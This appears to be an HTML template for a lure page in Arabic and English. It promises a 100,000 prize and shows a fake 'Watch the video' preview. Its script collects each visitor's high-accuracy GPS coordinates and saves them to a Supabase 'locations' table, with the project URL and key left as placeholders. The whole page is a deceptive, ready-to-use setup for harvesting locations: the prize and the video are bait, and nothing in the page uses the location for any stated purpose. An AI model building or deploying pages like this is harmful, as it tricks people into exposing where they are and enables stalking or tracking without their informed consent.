<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You’ll win 100,000</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: #111;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .page {
            width: 100%;
            max-width: 600px;
            background: #fff;
            border-radius: 16px;
            overflow: hidden;
        }

        .content {
            padding: 25px;
            text-align: center;
        }

        h1 {
            margin: 0 0 10px;
            font-size: 28px;
        }

        .subtitle {
            color: #555;
            margin-bottom: 20px;
        }

        .video-preview {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background:
                linear-gradient(
                    135deg,
                    #222,
                    #555
                );
            border-radius: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }

        .play-button {
            width: 75px;
            height: 75px;
            border-radius: 50%;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 34px;
            color: #222;
            padding-left: 5px;
        }

        .video-label {
            position: absolute;
            bottom: 15px;
            right: 15px;
            left: 15px;
            color: white;
            font-size: 16px;
        }

        .info {
            margin-top: 20px;
            padding: 15px;
            background: #f2f2f2;
            border-radius: 10px;
            line-height: 1.7;
            color: #444;
        }

        #locationButton {
            width: 100%;
            margin-top: 20px;
            padding: 15px;
            border: none;
            border-radius: 9px;
            background: #007bff;
            color: white;
            font-size: 18px;
            cursor: pointer;
        }

        #locationButton:hover {
            background: #0056b3;
        }

        #locationButton:disabled {
            background: #888;
            cursor: not-allowed;
        }

        #result {
            margin-top: 20px;
            line-height: 1.8;
        }

        .success {
            color: #159447;
            font-weight: bold;
        }

        .error {
            color: #d00000;
            font-weight: bold;
        }
    </style>
</head>

<body>

<div class="page">

    <div class="content">

        <h1>You’ll win 100,000</h1>

        <div class="subtitle">
            Go register your name to be among the winners.
        </div>

        <div class="video-preview">

            <div class="play-button">
                ▶
            </div>

            <div class="video-label">
                Watch the video
            </div>

        </div>

        <div class="info">
            To continue, you can choose to share your location.
            Your browser will ask for your permission.
        </div>

        <button id="locationButton">
            Share My Location
        </button>

        <div id="result"></div>

    </div>

</div>


<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>

const SUPABASE_URL =
    "ضع Project URL هنا";

const SUPABASE_PUBLISHABLE_KEY =
    "ضع Publishable Key هنا";


const supabaseClient =
    window.supabase.createClient(
        SUPABASE_URL,
        SUPABASE_PUBLISHABLE_KEY
    );


const button =
    document.getElementById("locationButton");

const result =
    document.getElementById("result");


button.addEventListener("click", function () {

    if (!navigator.geolocation) {

        result.innerHTML =
            '<span class="error">' +
            'المتصفح لا يدعم تحديد الموقع.' +
            '</span>';

        return;
    }

    button.disabled = true;

    result.textContent =
        "جاري طلب إذن الموقع...";


    navigator.geolocation.getCurrentPosition(

        async function(position) {

            const latitude =
                position.coords.latitude;

            const longitude =
                position.coords.longitude;

            const accuracy =
                position.coords.accuracy;


            result.textContent =
                "جاري حفظ الموقع...";


            const { error } =
                await supabaseClient
                    .from("locations")
                    .insert({
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy
                    });


            if (error) {

                console.error(error);

                result.innerHTML =
                    '<span class="error">' +
                    'فشل تسجيل الموقع.' +
                    '</span>';

                button.disabled = false;

                return;
            }


            result.innerHTML =
                '<span class="success">' +
                'تم تسجيلك بنجاح ✅' +
                '</span>';

            button.disabled = false;
        },


        function(error) {

            console.error(error);

            result.innerHTML =
                '<span class="error">' +
                'لم تتم مشاركة الموقع.' +
                '</span>';

            button.disabled = false;
        },


        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }

    );

});

</script>

</body>
</html>
